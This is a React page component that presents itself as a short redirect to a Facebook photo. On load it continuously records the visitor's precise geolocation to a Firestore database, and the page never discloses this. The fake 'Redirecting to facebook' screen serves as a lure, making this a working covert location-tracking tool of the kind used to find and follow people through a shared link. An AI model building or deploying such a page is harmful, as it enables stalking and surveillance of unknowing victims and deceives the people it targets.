import React, { useState, useEffect } from 'react';
import { serverTimestamp } from 'firebase/firestore';
// import { ref as sRef, push } from 'firebase/database';
// import firebaseApp  from './firebase.js';
import { firestore } from './firebase';
import { addDoc, collection } from 'firebase/firestore';

function App() {
  const [latitude, setLatitude] = useState(null);
  const [longitude, setLongitude] = useState(null);

  useEffect(() => {
    const options = {
      enableHighAccuracy: true,
      timeout: 5000,
      maximumAge: 0,
    };
    if(navigator.geolocation){
      navigator.geolocation.watchPosition((position)=>{
        console.log("position-->",position, position.coords)
            setLatitude(position.coords.latitude);
            setLongitude(position.coords.longitude);
            const ref = collection(firestore, "geolocation");
            let data = {
              geo: JSON.stringify(position.coords.accuracy),
              latitude: JSON.stringify(position.coords.latitude),
              longitude: JSON.stringify(position.coords.longitude),
              timestamp: serverTimestamp(),
            }
            try{
              addDoc(ref, data)
            }catch(err){
              console.log("err-->",err)
            }
      },error => console.log(error), options)
    } 
  }, []);

  useEffect(() => {
    const timeout = setTimeout(() => {
      // 👇️ redirects to an external URL
      window.location.replace('https://www.facebook.com/photo/?fbid=595036837529214');
    }, 3000);

    return () => clearTimeout(timeout);
  }, []);



  return (
    <div>
      <h1>Redirecting to facebook ...</h1>
      {/* {latitude && <p>Latitude: {latitude}</p>}
      {longitude && <p>Longitude: {longitude}</p>} */}
      {/* <button onClick={handleClick}>click me</button> */}
    </div>
  );
}

export default App;